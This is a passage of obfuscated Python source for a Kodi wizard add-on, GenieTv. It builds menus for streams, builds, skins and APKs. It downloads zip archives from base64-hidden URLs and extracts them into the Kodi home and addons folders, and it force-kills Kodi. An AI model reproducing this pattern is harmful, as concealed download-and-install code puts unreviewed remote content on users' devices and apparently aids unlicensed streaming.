 Oo0000oOo ( oooOOOOO , IIi1iiii1iI , O0Oo00OoOo , ii1ii111 , i11111I1I , ii1 , ooo0 , oO000oOo00o0o )
 time . sleep ( 1 )
 I11o0oO00oO0o0o0 = xbmc . translatePath ( os . path . join ( oOOOooo , Ii11iiI + '_guisettings.zip' ) )
 I1I = zipfile . ZipFile ( I11o0oO00oO0o0o0 , mode = 'w' )
 try :
  I1I . write ( xbmc . translatePath ( os . path . join ( oooOOOOO , 'userdata' , 'profiles.xml' ) ) , 'profiles.xml' , zipfile . ZIP_DEFLATED )
 except : pass
 I1I . close ( )
 if Oooo0 == 0 :
  i1iiIIiiI111 . ok ( "FAILED!" , 'The guisettings.xml file could not be found on your' , 'system, please reboot and try again.' , '' )
 else :
  i1iiIIiiI111 . ok ( "SUCCESS!" , 'You Are Now Backed Up. If you\'d like to share this build with' , 'the community please post details on the forum at' , '[COLOR=blue][B]http://rh-project.info[/COLOR][/B]' )
  i1iiIIiiI111 . ok ( "Build Locations" , 'Full Backup (only used to restore on this device): [COLOR=yellow]' + I1i1iiiII1i , '[/COLOR]Universal Backup (can be used on any device): [COLOR=yellow]' + IIi1iiii1iI + '[/COLOR]' )
  if 89 - 89: i1IIi / OoOoOO00 . iIii1I11I1II1
def Oo0000oOo ( sourcefile , destfile , message_header , message1 , message2 , message3 , exclude_dirs , exclude_files ) :
 i11IIIiI1I = zipfile . ZipFile ( destfile , 'w' , zipfile . ZIP_DEFLATED )
 o0iiiI1I1iIIIi1 = len ( sourcefile )
 Iii = [ ]
 I1iiiiI1iI = [ ]
 Oo0oO0ooo . create ( message_header , message1 , message2 , message3 )
 for iIiiiii1i , iiIi1IIiI , i1oO0OO0 in os . walk ( sourcefile ) :
  for file in i1oO0OO0 :
   I1iiiiI1iI . append ( file )
 o0O0Oo00 = len ( I1iiiiI1iI )
 for iIiiiii1i , iiIi1IIiI , i1oO0OO0 in os . walk ( sourcefile ) :
  iiIi1IIiI [ : ] = [ O0Oo0o000oO for O0Oo0o000oO in iiIi1IIiI if O0Oo0o000oO not in exclude_dirs ]
  i1oO0OO0 [ : ] = [ oO00oo0o00o0o for oO00oo0o00o0o in i1oO0OO0 if oO00oo0o00o0o not in exclude_files ]
  for file in i1oO0OO0 :
   Iii . append ( file )
   oO0o00oOOooO0 = len ( Iii ) / float ( o0O0Oo00 ) * 100
   Oo0oO0ooo . update ( int ( oO0o00oOOooO0 ) , "Backing Up" , '[COLOR yellow]%s[/COLOR]' % file , 'Please Wait' )
   OOOoO000 = os . path . join ( iIiiiii1i , file )
   if not 'temp' in iiIi1IIiI :
    if not 'plugin.program.originwizard' in iiIi1IIiI :
     import time
     oOOOO = '01/01/1980'
     IiIi1ii111i1 = time . strftime ( '%d/%m/%Y' , time . gmtime ( os . path . getmtime ( OOOoO000 ) ) )
     if IiIi1ii111i1 > oOOOO :
      i11IIIiI1I . write ( OOOoO000 , OOOoO000 [ o0iiiI1I1iIIIi1 : ] )
 i11IIIiI1I . close ( )
 Oo0oO0ooo . close ( )
 if 31 - 31: i11i1 + O0
 if 87 - 87: oOO
def IIIii ( ) :
 I1 ( )
 iIiIIIi ( '[COLORgreen]SCOOBY STREAMS[/COLOR]' , ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9zY29vYnkvdHZjYXRzLnBocA==' ) ) , 1016 , ii11iIi1I + 'scoob.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]SCOOBY SCRAPES[/COLOR]' , iiI1IiI , 1024 , ii11iIi1I + 'scoob.png' , i1iiIII111ii , '' )
 if 83 - 83: iI1Ii11iII1 % OOooOOo % OOOo0 . iIii1I11I1II1 - iI1Ii11iII1
 if 88 - 88: OoooooooOO
def OO00 ( ) :
 I1 ( )
 iIiIIIi ( '[COLORgreen]SEARCH MOVIES[/COLOR]' , iiI1IiI , 9001 , ii11iIi1I + 'MOVIESv.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]SEARCH SERIES[/COLOR]' , iiI1IiI , 9002 , ii11iIi1I + 'TVSHOWSv.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]SEARCH CARTOONS[/COLOR]' , '' , 10005 , ii11iIi1I + 'ORIGINCARTOON' , i1iiIII111ii , '' )
 if 28 - 28: Ooo0OO0oOO - i11iIiiIii . ii11ii1ii + iI1Ii11iII1 / ii11ii1ii
 if 35 - 35: iI1Ii11iII1
 if 75 - 75: Oo / ii11ii1ii . iI1Ii11iII1 * i11i1 - OoOoOO00
 if 41 - 41: oO0O
def oOOoo0o0OOOO ( ) :
 I1 ( )
 iIiIIIi ( '[COLORgreen]RADIO[/COLOR]' , iiI1IiI , 1013 , ii11iIi1I + 'radio.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'CONCERTS' ) == 'true' :
  iIiIIIi ( '[COLORgreen]CONCERTS[/COLOR]' , ( i1111 ( 'aHR0cHM6Ly93d3cucmVkZGl0LmNvbS9yL2Z1bGxjb25jZXJ0cy8=' ) ) , 7050 , ii11iIi1I + 'concerts.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]MUSIC[/COLOR]' , iiI1IiI , 1030 , ii11iIi1I + 'MUSIC.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]MUSIC ARCHIVE[/COLOR]' , iiI1IiI + ( i1111 ( 'L3ZvZC91cmxzL211c2ljLnBocA==' ) ) , 1010 , ii11iIi1I + 'MUSIC.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]MUSIC SEARCH[/COLOR]' , iiI1IiI , 1111 , ii11iIi1I + 'search.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]KODIBLE AUDIO BOOKS[/COLOR]' , 'http://doremisa.com/audiobooks/' , 30000 , ii11iIi1I + 'kodible.png' , i1iiIII111ii , '' )
 if 26 - 26: II1i1IiiIIi11 % iIii1I11I1II1 + OOooOOo
 i1IIIiiII1 ( 'movies' , 'MAIN' )
 if 67 - 67: Ooo0OO0oOO + OoOoOO00 - O0 . Ooo0OO0oOO * OoOoOO00 * OOoo0OO0
def o00OO00O0oOO ( ) :
 I1 ( )
 if 4 - 4: OoooooooOO - i1IIi % oO0O - i11i1 * OOooOOo
 oo00O00oO ( 'DELETE CACHE' , 'url' , 14 , ii11iIi1I + 'MAIN5.png' , i1iiIII111ii , '' )
 oo00O00oO ( 'DELETE PACKAGES' , 'url' , 6 , ii11iIi1I + 'MAIN4.png' , i1iiIII111ii , '' )
 oo00O00oO ( 'FORCE REFRESH' , 'url' , 10 , ii11iIi1I + 'MAIN3.png' , i1iiIII111ii , 'Force Refresh All Repos' )
 if 85 - 85: OoooooooOO * iIii1I11I1II1 . II1i1IiiIIi11 / OoooooooOO % OOOo0 % O0
 oo00O00oO ( 'CHECK MY IP' , 'url' , 12 , ii11iIi1I + 'MAIN2.png' , i1iiIII111ii , '' )
 oo00O00oO ( 'ANDROID ONLY DELETE TEXTURE13.DB&THUBMNAIL FOLDER' , 'url' , 13 , ii11iIi1I + 'MAIN1.png' , i1iiIII111ii , 'Only Works On Android On Windows It Deletes Your Thumnails Folder But Does Not Delete The Textures13.db' )
 iIiIIIi ( '[COLORgreen]ADVANCED SETTINGS XML[/COLOR]' , iiI1IiI , 4 , ii11iIi1I + 'XML.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]URL FIXES[/COLOR]' , iiI1IiI , 20 , ii11iIi1I + 'URLFIX.png' , i1iiIII111ii , '' )
 i1IIIiiII1 ( 'movies' , 'MAIN' )
 if 36 - 36: oO0O / OoOoOO00 / iI1Ii11iII1 / iI1Ii11iII1 + ii11ii1ii
 if 95 - 95: iI1Ii11iII1
def iI1Ii11111iIi ( ) :
 I1 ( )
 iIiIIIi ( '[COLORgreen]REPOS[/COLOR]' , ( i1111 ( 'aHR0cDovL21pcnJvcnMua29kaS50di9hZGRvbnMv' ) ) , 2030 , ii11iIi1I + 'repos.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]NEW[/COLOR]' , iiI1IiI , 22 , ii11iIi1I + 'NEW.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]IPTV[/COLOR]' , iiI1IiI , 23 , ii11iIi1I + 'IPTV.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]VIDEO[/COLOR]' , iiI1IiI , 24 , ii11iIi1I + 'VIDEO.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]SPORTS[/COLOR]' , iiI1IiI , 25 , ii11iIi1I + 'SPORTS.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]KIDS[/COLOR]' , iiI1IiI , 26 , ii11iIi1I + 'KIDS.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]MUSIC[/COLOR]' , iiI1IiI , 27 , ii11iIi1I + 'MUSIC.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]PROGRAMS[/COLOR]' , iiI1IiI , 28 , ii11iIi1I + 'PROGRAMS.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]XXX[/COLOR]' , 'URL' , 29 , ii11iIi1I + 'XXX.png' , i1iiIII111ii , '' )
 i1IIIiiII1 ( 'movies' , 'MAIN' )
 if 51 - 51: OoOoOO00 + iI1Ii11iII1 . i1IIi . ii11ii1ii + I1IiI * OOOo0
 if 72 - 72: Ooo0OO0oOO + Ooo0OO0oOO / OoOoOO00 . OoooooooOO % oO0O
def III ( ) :
 I1 ( )
 oo00O00oO ( 'CHECK ADVANCED XML' , iiI1IiI , 8 , ii11iIi1I + 'XML.png' , i1iiIII111ii , '' )
 oo00O00oO ( 'MUCKYS XML' , iiI1IiI + '/wizard/muckys.xml' , 7 , ii11iIi1I + 'XML.png' , i1iiIII111ii , '' )
 oo00O00oO ( '0CACHE XML' , iiI1IiI + '/wizard/0cache.xml' , 7 , ii11iIi1I + 'XML.png' , i1iiIII111ii , '' )
 oo00O00oO ( 'MIKEY1234 XML' , iiI1IiI + '/wizard/mikey.xml' , 7 , ii11iIi1I + 'XML.png' , i1iiIII111ii , '' )
 oo00O00oO ( 'TUXENS XML' , iiI1IiI + '/wizard/tuxens.xml' , 7 , ii11iIi1I + 'XML.png' , i1iiIII111ii , '' )
 oo00O00oO ( 'P2P RECOMMENDED XML1' , iiI1IiI + '/wizard/p2p1.xml' , 7 , ii11iIi1I + 'XML.png' , i1iiIII111ii , '' )
 oo00O00oO ( 'P2P RECOMMENDED XML2' , iiI1IiI + '/wizard/p2p2.xml' , 7 , ii11iIi1I + 'XML.png' , i1iiIII111ii , '' )
 oo00O00oO ( 'DELETE XML' , iiI1IiI , 11 , ii11iIi1I + 'XML.png' , i1iiIII111ii , '' )
 i1IIIiiII1 ( 'movies' , 'MAIN' )
 if 41 - 41: i11iIiiIii + Oo / OOOo0 . OoooooooOO % Ooo0OO0oOO % i1IIi
def oOOIi1II ( ) :
 I1 ( )
 oo00O00oO ( '[COLORgreen]My Local Zip[/COLOR]' , I11 , 48 , ii11iIi1I + 'MB.png' , i1iiIII111ii , '' )
 oo00O00oO ( '[COLORgreen]My Online Zip[/COLOR]' , i11 , 43 , ii11iIi1I + 'MB.png' , i1iiIII111ii , '' )
 if 89 - 89: I1I1ii + OoooooooOO + I1I1ii * i1IIi + iIii1I11I1II1 % OOoo0OO0
def oOo0oO ( ) :
 I1 ( )
 oo00O00oO ( 'INSTALL FTV GUIDE AND OTHER ADDONS REQUIRED' , iiI1IiI + '/wizard/customftv/ftvguide-addons.zip' , 5 , ii11iIi1I + 'FTV4.png' , i1iiIII111ii , '' )
 oo00O00oO ( 'FTV GUIDE FIRST RUN SETTINGS' , iiI1IiI + '/wizard/customftv/settings.xml' , 17 , ii11iIi1I + 'FTV3.png' , i1iiIII111ii , '' )
 oo00O00oO ( 'FTV GUIDE ADDONS2.INI UPDATE DAILY' , 'http://ren.byethost12.com/addons2.ini' , 16 , ii11iIi1I + 'FTV1.png' , i1iiIII111ii , '' )
 oo00O00oO ( 'RESET FTV DATABASE' , 'url' , 18 , ii11iIi1I + 'FTV2.png' , i1iiIII111ii , '' )
 if 5 - 5: i11i1 - i11i1 . Oo + I1IiI - i11i1 . Ooo0OO0oOO
 if 31 - 31: OoOoOO00 - iIii1I11I1II1 - iIii1I11I1II1 % OOoo0OO0
 if 12 - 12: iIii1I11I1II1
def iIi1i ( ) :
 I1 ( )
 iIiIIIi ( '[COLORgreen]SKINS[/COLOR]' , iiI1IiI , 33 , ii11iIi1I + 'skinp.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]ARTWORK PACKS[/COLOR]' , iiI1IiI , 34 , ii11iIi1I + 'artp.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]CREATE UNIVERSAL PATHS[/COLOR]' , oooOOOOO , 35 , ii11iIi1I + 'GUI.png' , i1iiIII111ii , '' )
 i1IIIiiII1 ( 'movies' , 'MAIN' )
 if 4 - 4: I1I1ii / i11iIiiIii / i11i1
def OooO0ooo0o ( url ) :
 iii1 = I1ii1Ii1 ( I1iOOOO ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 IiI11iII1 = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( iii1 )
 for oO00oooOOoOo0 , url , OOOO0OOO , i1i1ii , Iiii1iI1i in IiI11iII1 :
  iIiIIIi ( oO00oooOOoOo0 , url , 5 , OOOO0OOO , i1i1ii , Iiii1iI1i )
 i1IIIiiII1 ( 'movies' , 'MAIN' )
 if 88 - 88: II1i1IiiIIi11
def iiI11I1i1i1iI ( ) :
 I1 ( )
 iIiIIIi ( '[COLORgreen]GOTHAM SKINS[/COLOR]' , iiI1IiI , 36 , ii11iIi1I + 'GSKIN.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]HELIX SKINS[/COLOR]' , iiI1IiI , 37 , ii11iIi1I + 'HSKIN.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]ISENGAARD SKINS[/COLOR]' , oooOOOOO , 38 , ii11iIi1I + 'ISKIN.png' , i1iiIII111ii , '' )
 i1IIIiiII1 ( 'movies' , 'MAIN' )
 if 60 - 60: OoooooooOO % Oo + i11i1 . oOO * iIii1I11I1II1
def oooo00 ( url ) :
 iii1 = I1ii1Ii1 ( iiI1IiI + O00OO0oO ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 IiI11iII1 = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( iii1 )
 for oO00oooOOoOo0 , url , OOOO0OOO , i1i1ii , Iiii1iI1i in IiI11iII1 :
  iIiIIIi ( oO00oooOOoOo0 , url , 42 , OOOO0OOO , i1i1ii , Iiii1iI1i )
 i1IIIiiII1 ( 'movies' , 'MAIN' )
 if 25 - 25: Oo % ii11ii1ii * oOO
def I11oo0ooOO ( url ) :
 iii1 = I1ii1Ii1 ( iiI1IiI + iI1IiIIiIIi ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 IiI11iII1 = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( iii1 )
 for oO00oooOOoOo0 , url , OOOO0OOO , i1i1ii , Iiii1iI1i in IiI11iII1 :
  iIiIIIi ( oO00oooOOoOo0 , url , 42 , OOOO0OOO , i1i1ii , Iiii1iI1i )
 i1IIIiiII1 ( 'movies' , 'MAIN' )
 if 10 - 10: OOOo0 - i1IIi - oOO % Oo
def iIIII1i ( url ) :
 iii1 = I1ii1Ii1 ( iiI1IiI + o00oO0 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 IiI11iII1 = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( iii1 )
 for oO00oooOOoOo0 , url , OOOO0OOO , i1i1ii , Iiii1iI1i in IiI11iII1 :
  iIiIIIi ( oO00oooOOoOo0 , url , 42 , OOOO0OOO , i1i1ii , Iiii1iI1i )
 i1IIIiiII1 ( 'movies' , 'MAIN' )
 if 5 - 5: iIii1I11I1II1
def OOo ( url ) :
 iii1 = I1ii1Ii1 ( i1111 ( 'aHR0cHM6Ly9kbC5kcm9wYm94dXNlcmNvbnRlbnQuY29tL3MvN2ZrMjhndDlwb3QxMjJhL0JVSUxEUy50eHQ/ZGw9MA==' ) ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 IiI11iII1 = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( iii1 )
 for oO00oooOOoOo0 , url , OOOO0OOO , i1i1ii , Iiii1iI1i in IiI11iII1 :
  iIiIIIi ( oO00oooOOoOo0 , url , 42 , OOOO0OOO , i1i1ii , Iiii1iI1i )
 i1IIIiiII1 ( 'movies' , 'MAIN' )
 if 94 - 94: oO0O + iIii1I11I1II1 % Ooo00oOo00o
def O0OO0oOOo ( url ) :
 iii1 = I1ii1Ii1 ( iiI1IiI + OO0oO0o ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 IiI11iII1 = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( iii1 )
 for oO00oooOOoOo0 , url , OOOO0OOO , i1i1ii , Iiii1iI1i in IiI11iII1 :
  iIiIIIi ( oO00oooOOoOo0 , url , 40 , OOOO0OOO , i1i1ii , Iiii1iI1i )
 i1IIIiiII1 ( 'movies' , 'MAIN' )
 if 39 - 39: OOooOOo * oOO + oO0O * OoOoOO00
def OoO00o0 ( url ) :
 iii1 = I1ii1Ii1 ( iiI1IiI + OOoOoO00O0O0o ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 IiI11iII1 = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( iii1 )
 for oO00oooOOoOo0 , url , OOOO0OOO , i1i1ii , Iiii1iI1i in IiI11iII1 :
  iIiIIIi ( oO00oooOOoOo0 , url , 5 , OOOO0OOO , i1i1ii , Iiii1iI1i )
 i1IIIiiII1 ( 'movies' , 'MAIN' )
 if 12 - 12: ii11ii1ii + Ooo00oOo00o % OOoo0OO0
def o0Ooo0o0ooo0 ( ) :
 IIi1IIIi = O00Ooo ( i1111 ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20vYXBrdG9vbC9hcGsucGhw' ) )
 IiI11iII1 = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /></a><br><b>(.+?)</b>' ) . findall ( IIi1IIIi )
 for ooooO0oOoOOoO , OoOoo00Ooo00 , oO00oooOOoOo0 in IiI11iII1 :
  oo0o0000Oo0 ( oO00oooOOoOo0 , ooooO0oOoOOoO , 2031 , OoOoo00Ooo00 )
  if 80 - 80: I1I1ii - Oo
def OOooO ( name , url , description ) :
 O00OoOO0oo0 = xbmc . translatePath ( os . path . join ( O00O0OO00oo , 'Download' ) )
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 Oo0oO0ooo . create ( "Your App Is Downloading" , "Why not check out our website" , '' , 'Http://architects.x10host.com' )
 oOOO = os . path . join ( O00OoOO0oo0 , name + '.apk' )
 try :
  os . remove ( oOOO )
 except :
  pass
 downloader . download ( url , oOOO , Oo0oO0ooo )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( "GenieTv" , "[COLORred]Please press ok, exit kodi and go to your downloads folder to install your app[/COLOR]" , "[COLORblue]Tool Brought To You By Architects@Work[/COLOR]" )
 if 56 - 56: ii11ii1ii
def iiiii1IIII ( url ) :
 O00OoOO0oo0 = xbmc . translatePath ( os . path . join ( 'special://home/addons/plugin.video.GenieTv/resources/downloads' ) )
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 Oo0oO0ooo . create ( "Your fILM Is Downloading" , "Why not check out our website" , '' , 'Http://architects.x10host.com' )
 oOOO = os . path . join ( O00OoOO0oo0 , oO00oooOOoOo0 + '.mp4' )
 try :
  os . remove ( oOOO )
 except :
  pass
 downloader . download ( url , oOOO , Oo0oO0ooo )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( "GenieTv" , "[COLORred]Please press ok, Your download With Be Avaiilable Via The My Downloads Button[/COLOR]" , "[COLORblue]Tool Brought To You By Architects@Work[/COLOR]" )
 if 36 - 36: i1IIi / O0 / Ooo00oOo00o - O0 - i1IIi
 if 22 - 22: i1IIi + oO0O
def O0o0O0OO00o ( name , url , description ) :
 O00OoOO0oo0 = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 Oo0oO0ooo . create ( "Your Art Pack Is Downloading" , "Why not check out our website" , '' , 'Http://architects.x10host.com' )
 oOOO = os . path . join ( O00OoOO0oo0 , name )
 try :
  os . remove ( oOOO )
 except :
  pass
 downloader . download ( url , oOOO , Oo0oO0ooo )
 OOo00O = xbmc . translatePath ( os . path . join ( oo00 ) )
 time . sleep ( 2 )
 Oo0oO0ooo . update ( 0 , "" , "Placing Your Art Please Wait" )
 print '======================================='
 print OOo00O
 print '======================================='
 extract . all ( oOOO , OOo00O , Oo0oO0ooo )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( "GenieTv" , "[COLORred]Once complete your artwork will be stored in your Media folder, Accessible via the Homefolder, Enjoy[/COLOR]" )
 if 81 - 81: iI1Ii11iII1 . OOooOOo / I1I1ii
 if 17 - 17: i11iIiiIii - i11i1 . iI1Ii11iII1 % iIii1I11I1II1 + OOoo0OO0 - oOO
def O0oOooo0OOooO ( url ) :
 iii1 = I1ii1Ii1 ( i1111 ( 'aHR0cDovL2dlbmlldHYuYXJjaGl0ZWN0cy54MTBob3N0LmNvbS90ZXN0L3doLnR4dA==' ) ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 IiI11iII1 = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( iii1 )
 for oO00oooOOoOo0 , url , OOOO0OOO , i1i1ii , Iiii1iI1i in IiI11iII1 :
  iIiIIIi ( oO00oooOOoOo0 , url , 5 , OOOO0OOO , i1i1ii , Iiii1iI1i )
 try :
  iii1 = I1ii1Ii1 ( o0O0O0o0o0o + oO0o0o0ooO0oO + IIIIIiI ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
  IiI11iII1 = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( iii1 )
  for oO00oooOOoOo0 , url , OOOO0OOO , i1i1ii , Iiii1iI1i in IiI11iII1 :
   iIiIIIi ( oO00oooOOoOo0 , url , 5 , OOOO0OOO , i1i1ii , Iiii1iI1i )
 except : pass
 i1IIIiiII1 ( 'movies' , 'INFO' )
 if 80 - 80: iIii1I11I1II1 * I1I1ii % OOoo0OO0 % Oo
 if 95 - 95: iIii1I11I1II1 - ii11ii1ii . I1I1ii - OOOo0
def OOOOoo ( url ) :
 iii1 = I1ii1Ii1 ( i1111 ( 'aHR0cDovL2dlbmlldHYuYXJjaGl0ZWN0cy54MTBob3N0LmNvbS90ZXN0L3doLnR4dA==' ) ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 IiI11iII1 = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( iii1 )
 for oO00oooOOoOo0 , url , OOOO0OOO , i1i1ii , Iiii1iI1i in IiI11iII1 :
  iIiIIIi ( oO00oooOOoOo0 , url , 43 , OOOO0OOO , i1i1ii , Iiii1iI1i )
 try :
  iii1 = I1ii1Ii1 ( o0O0O0o0o0o + oO0o0o0ooO0oO + IIIIIiI ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
  IiI11iII1 = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( iii1 )
  for oO00oooOOoOo0 , url , OOOO0OOO , i1i1ii , Iiii1iI1i in IiI11iII1 :
   iIiIIIi ( oO00oooOOoOo0 , url , 43 , OOOO0OOO , i1i1ii , Iiii1iI1i )
 except : pass
 i1IIIiiII1 ( 'movies' , 'INFO' )
 if 84 - 84: oO0O / iI1Ii11iII1
 if 86 - 86: I1IiI * OoOoOO00 - O0 . I1IiI % iIii1I11I1II1 / i11i1
def IiIIiIIIiIii ( name , url , description ) :
 O00OoOO0oo0 = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 Oo0oO0ooo . create ( "GenieTv" , "Downloading Content" , '' , 'Please Wait' )
 oOOO = os . path . join ( O00OoOO0oo0 , name + '.zip' )
 try :
  os . remove ( oOOO )
 except :
  pass
 downloader . download ( url , oOOO , Oo0oO0ooo )
 I1i11II = xbmc . translatePath ( os . path . join ( 'special://home' , 'addons' ) )
 time . sleep ( 2 )
 Oo0oO0ooo . update ( 0 , "" , "Extracting Zip Please Wait" )
 print '======================================='
 print I1i11II
 print '======================================='
 extract . all ( oOOO , I1i11II , Oo0oO0ooo )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( "GenieTv" , "Press ok to finish install" , "[COLOR yellow]Brought To You By Architects@Work[/COLOR]" )
 O0O0Oooo0o ( )
 if 31 - 31: Ooo0OO0oOO / iI1Ii11iII1 * OOooOOo . OoOoOO00
 if 89 - 89: O0
def IIIII1I1Ii11iI ( name , url , description ) :
 O00OoOO0oo0 = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 Oo0oO0ooo . create ( "GenieTv" , "Downloading " , '' , 'Please Wait' )
 oOOO = os . path . join ( O00OoOO0oo0 , 'plugin.program.GenieTv.install' + '.zip' )
 try :
  os . remove ( oOOO )
 except :
  pass
 downloader . download ( url , oOOO , Oo0oO0ooo )
 I1i11II = xbmc . translatePath ( os . path . join ( 'special://' , 'home' ) )
 time . sleep ( 2 )
 Oo0oO0ooo . update ( 0 , "" , "Extracting Zip Please Wait" )
 print '======================================='
 print I1i11II
 print '======================================='
 extract . all ( oOOO , I1i11II , Oo0oO0ooo )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( "GenieTv" , "Press ok to force close kodi, if unsuccessful using windows Please kill kodi via taskmanager" , "[COLOR yellow]Brought To You By Architects@Work[/COLOR]" )
 oO00OoOO ( )
 if 18 - 18: oOO - I1IiI % i1IIi + O0 + i11iIiiIii + i1IIi
def oOo0o0O ( name , url , description ) :
 O00OoOO0oo0 = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 Oo0oO0ooo . create ( "GenieTv" , "Downloading " , '' , 'Please Wait' )
 oOOO = os . path . join ( O00OoOO0oo0 , 'plugin.program.GenieTv.install' + '.zip' )
 try :
  os . remove ( oOOO )
 except :
  pass
 downloader . download ( url , oOOO , Oo0oO0ooo )
 I1i11II = xbmc . translatePath ( os . path . join ( 'special://' , 'home' ) )
 time . sleep ( 2 )
 Oo0oO0ooo . update ( 0 , "" , "Extracting Zip Please Wait" )
 print '======================================='
 print I1i11II
 print '======================================='
 extract . all ( oOOO , I1i11II , Oo0oO0ooo )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( "GenieTv" , "Please Disconnect The Power From Your Device. DO NOT EXIT CLEANLY VIA SHUTDOWN" , "[COLOR yellow]Brought To You By Architects@Work[/COLOR]" )
 if 83 - 83: OOooOOo / i11i1 / i11i1 + OOooOOo * I1I1ii + OOooOOo
 if 36 - 36: I1IiI + OOooOOo - OoooooooOO . Ooo0OO0oOO . OoooooooOO / Oo
def o00O ( name , url , description ) :
 I1i11II = xbmc . translatePath ( os . path . join ( 'special://' , 'home' ) )
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 oOOO = os . path . join ( I11 )
 time . sleep ( 2 )
 Oo0oO0ooo . create ( "GenieTv" , "Restoring" , '' , 'Please Wait' )
 print '======================================='
 print I1i11II
 print '======================================='
 extract . all ( oOOO , I1i11II , Oo0oO0ooo )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( "GenieTv" , "Please Disconnect The Power From Your Device. DO NOT EXIT CLEANLY VIA SHUTDOWN" , "[COLOR yellow]Brought To You By Architects@Work[/COLOR]" )
 if 48 - 48: II1i1IiiIIi11 . i11iIiiIii
 if 5 - 5: Ooo0OO0oOO . ii11ii1ii . OoOoOO00 . OoooooooOO
def oO00OoOO ( ) :
 Oo0OooO0 = xbmcgui . Dialog ( ) . yesno ( 'Force Close Kodi' , 'You are about to close Kodi' , 'Would you like to continue?' , nolabel = 'No, Cancel' , yeslabel = 'Yes, Close' )
 if Oo0OooO0 == 0 :
  return
 elif Oo0OooO0 == 1 :
  pass
 oO00oOo0OOO = ii1ooO ( )
 print "Platform: " + str ( oO00oOo0OOO )
 if oO00oOo0OOO == 'osx' :
  print "############   try osx force close  #################"
  try : os . system ( 'killall -9 XBMC' )
  except : pass
  try : os . system ( 'killall -9 Kodi' )
  except : pass
